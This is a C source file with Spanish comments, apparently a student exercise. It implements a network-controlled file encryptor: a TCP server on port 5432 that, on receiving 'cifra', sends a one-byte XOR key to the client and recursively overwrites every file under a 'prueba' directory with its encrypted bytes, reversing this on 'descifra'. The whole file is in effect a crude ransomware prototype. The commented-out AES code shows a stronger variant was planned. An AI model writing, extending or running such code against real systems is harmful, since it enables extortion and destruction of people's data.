#include <sys/types.h>
#include </usr/include/linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <math.h>
#include <openssl/aes.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define PORT 5432 // puerto de conexion

int sockfd, new_sockfd;  // descriptores de archivo
void cifrar(char *archivo);
void descifrar(char *archivo);
void abrirDirectorio(char *directorio,int cifra);
void generarllave();
unsigned char llave[32];
char llaveXOR;

int main(void){
  struct sockaddr_in host_addr, client_addr;  // Informacion de las direcciones IP
  socklen_t sin_size;
  int recv_length=1, yes=1;
  char buffer[1024];

  if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
    perror("Error al crear el socket");

  if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
    perror("Error al agregar la opcion SO_REUSEADDR en setsockopt");
  
  host_addr.sin_family = AF_INET;    // 
  host_addr.sin_port = htons(PORT);  //
  host_addr.sin_addr.s_addr = INADDR_ANY; // Asigno mi IPP
  memset(&(host_addr.sin_zero), '\0', 8); // El resto de la estructura en 0s

  if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)
    perror("Error haciendo el bind");

  if (listen(sockfd, 5) == -1)
    perror("Error al escuchar en el socket");

  generarllave();
  while(1) {    // Accept loop
    sin_size = sizeof(struct sockaddr_in);
    new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
    if(new_sockfd == -1)
      perror("Error al aceptar la conexion");
    printf("server: Conexion aceptada desde %s desde  %d\n",inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
    send(new_sockfd, ":v\n", 3, 0);
    recv_length = recv(new_sockfd, &buffer, 1024, 0);
    while(recv_length > 0) {
      printf("RECV: %d bytes\n", recv_length);
      printf("Recibiendo: %s\n",buffer);
      if (strcmp(buffer,"cifra\n")==0){
        // send(new_sockfd, "\nllave: ", 9, 0);
        // send(new_sockfd, llave, sizeof(llave), 0);
        // send(new_sockfd, "\n: ", 1, 0);
        send(new_sockfd, "\nllaveXOR: ", 11, 0);
        send(new_sockfd, &llaveXOR, sizeof(llaveXOR), 0);
        send(new_sockfd, "\n: ", 1, 0);
        printf("llaveXOR: %c\n", llaveXOR);
        abrirDirectorio("prueba",1);
      }else if(strcmp(buffer,"descifra\n")==0){
        // send(new_sockfd, "\nllave: ", 9, 0);
        // send(new_sockfd, llave, sizeof(llave), 0);
        // send(new_sockfd, "\n: ", 1, 0);
        abrirDirectorio("prueba",0);
      }else send(new_sockfd,"\n",1,0);
      recv_length = recv(new_sockfd, &buffer, 1024, 0);
    }
    close(new_sockfd);
  }
  return 0;
}

void abrirDirectorio(char *directorio,int cifra){
  // Abrimos el directorio actual
  DIR *d = opendir(directorio); //
  struct dirent *dentry;
  //mientras podamos leer los archivos dentro del directorio actual ejecutara el codigo
  while((dentry=readdir(d))!=NULL){
  //    printf("%s\n",dentry->d_name); //Imprime los archivos dentro del directorio
  // Validamos que no abra los archivos de . y ..
    if(strcmp(dentry->d_name,".")!=0 && strcmp(dentry->d_name,"..")!=0 ){
      // generamos un variable para guardar la ruta. Esto para poder cifrar los archivos que esten dentro de otro directorio.
      char *ruta=(char *) calloc(sizeof(char),512);
      //copiamos la ruta
       strcpy(ruta, directorio ); //ruta=./prueba/
      // le agregamos (concatenamos) el nombre del archivo
      strcat(ruta, "/" ); // ruta = ./prueba/
      strcat(ruta, dentry->d_name ); // ruta = ./prueba/nombre_archivo
      //printf("%s\n",dentry->d_name);
      //Mandamos a llamar la funcion cifrar
      if (cifra) cifrar(ruta);
      else descifrar(ruta);
    }
  }
}
void generarllave(){
  int fdrandom; //Declaracion de un descriptor de archivos.
  char *archivo="/dev/random"; // archivo que genera aleaotreamente
  fdrandom=open(archivo,O_RDONLY);// Se abre como solo lectura
  int num;
  // read regresa el numero de bits que leyo
  for (int i = 0; i < 32;i++){
    if(read(fdrandom,&num,sizeof(int))!=0){
      llave[i]= (unsigned char) abs(num%25) + 65;
    }
  }
  if(read(fdrandom,&num,sizeof(int))!=0) llaveXOR= (char) abs(num%25) + 65;
  // printf("\nmillave: %s\n", buffer);
  if(close(fdrandom)==-1) //debe cerrar.
    exit(1);
}
void cifrar(char *archivo){
  int fd,totalPalabra=0,fdw;
  char palabra;
  // printf("-----------------------------------------------\n");
  // printf("abriendo archivo: %s\n",archivo);
  // abrimos el archivo en modo de lectura y escrituta.
  fd=open(archivo,O_RDONLY);
  if(fd!=-1){
    //usamos stat para saber el tamaño del archivo
    struct stat fileStat;
    #if 0
      printf("Information for %s\n\n",archivo);
      printf("File Size: \t\t%d bytes\n",fileStat.st_size);
      printf("Number of Links: \t%d\n",fileStat.st_nlink);
      printf("File inode: \t\t%d\n",fileStat.st_ino);

      printf("File Permissions: \t");
      printf( (S_ISDIR(fileStat.st_mode)) ? "d" : "-");
      printf( (fileStat.st_mode & S_IRUSR) ? "r" : "-");
      printf( (fileStat.st_mode & S_IWUSR) ? "w" : "-");
      printf( (fileStat.st_mode & S_IXUSR) ? "x" : "-");
      printf( (fileStat.st_mode & S_IRGRP) ? "r" : "-");
      printf( (fileStat.st_mode & S_IWGRP) ? "w" : "-");
      printf( (fileStat.st_mode & S_IXGRP) ? "x" : "-");
      printf( (fileStat.st_mode & S_IROTH) ? "r" : "-");
      printf( (fileStat.st_mode & S_IWOTH) ? "w" : "-");
      printf( (fileStat.st_mode & S_IXOTH) ? "x" : "-");
      printf("\n\n"); 
      // printf("-----------------------------------------------\n");
    #endif
    if(fstat(fd,&fileStat) < 0)    
      exit(1);
    if (S_ISDIR(fileStat.st_mode)) {
      abrirDirectorio(archivo,1);
    }else{
      if (fileStat.st_size>0){
        char *palabraCifrada=(char *) calloc(sizeof(char),fileStat.st_size);
        char *palabraDescifrada=(char *) calloc(sizeof(char),fileStat.st_size);
        char *palabra=(char *) calloc(sizeof(char),fileStat.st_size);
        char auxpalabra;
        // Generamos una variable del tamaño del archivo
        int nread=0;
        // Leemos el archivo
        while( ( nread=read(fd,&palabra[totalPalabra++],sizeof(char)) ) >0 );
        close(fd);
        // fd=open(archivo,O_WRONLY);
        fd=open(archivo,O_RDWR);
        totalPalabra=0;
        while( ( nread=read(fd,&auxpalabra,sizeof(auxpalabra)) ) >0 ){
          //ciframos
          palabraCifrada[totalPalabra]=auxpalabra^ (int)(llaveXOR);
          printf("%c", palabraCifrada[totalPalabra]);
          lseek(fd,-1,SEEK_CUR);
          //escribimos en el archivo
          write(fd,&palabraCifrada[totalPalabra++],nread);
        }
        // AES_KEY enc_key, dec_key;

        // AES_set_encrypt_key(llave, 128, &enc_key);
        // AES_encrypt(palabra, palabraCifrada, &enc_key);
        // write(fd,palabraCifrada,sizeof(palabraCifrada));
        // printf("\noriginal: %s : %d\n",palabra, sizeof(palabra)/ sizeof(char));
        // printf("\nencrypted: %s : %d\n",palabraCifrada, sizeof(palabraCifrada));
        // // fd=open(archivo,O_RDWR);
        // printf("-----------------------------------------------\n");

      }
    }
  }
  //La llave para cifrar
  close(fd);
}
void descifrar(char *archivo){
  int fd,totalPalabra=0,fdw;
  char palabra;
  // printf("-----------------------------------------------\n");
  // printf("abriendo archivo: %s\n",archivo);
  // abrimos el archivo en modo de lectura y escrituta.
  fd=open(archivo,O_RDONLY);
  if(fd!=-1){
    //usamos stat para saber el tamaño del archivo
    struct stat fileStat;
    if(fstat(fd,&fileStat) < 0)    
      exit(1);
    if (S_ISDIR(fileStat.st_mode)) {
      abrirDirectorio(archivo,0);
    }else{
      if (fileStat.st_size>0){
        char *palabraDescifrada=(char *) calloc(sizeof(char),fileStat.st_size);
        char *palabra=(char *) calloc(sizeof(char),fileStat.st_size);
        char auxpalabra;
        // Generamos una variable del tamaño del archivo
        int nread=0;
        // Leemos el archivo
        while( ( nread=read(fd,&palabra[totalPalabra++],sizeof(char)) ) >0 );
        close(fd);
        fd=open(archivo,O_RDWR);
        // fd=open(archivo,O_WRONLY);
        totalPalabra=0;
        while( ( nread=read(fd,&auxpalabra,sizeof(auxpalabra)) ) >0 ){
          //ciframos
          palabraDescifrada[totalPalabra]=auxpalabra^ (int)(llaveXOR);
          lseek(fd,-1,SEEK_CUR);
          //escribimos en el archivo
          write(fd,&palabraDescifrada[totalPalabra++],nread);
        }
        // AES_KEY dec_key;
        // AES_set_decrypt_key(llave,128,&dec_key);
        // AES_decrypt(palabra, palabraDescifrada, &dec_key);
        // write(fd,palabraDescifrada,sizeof(palabraDescifrada));
        // printf("-----------------------------------------------\n");

      }
    }
  }
  //La llave para cifrar
  close(fd);
}
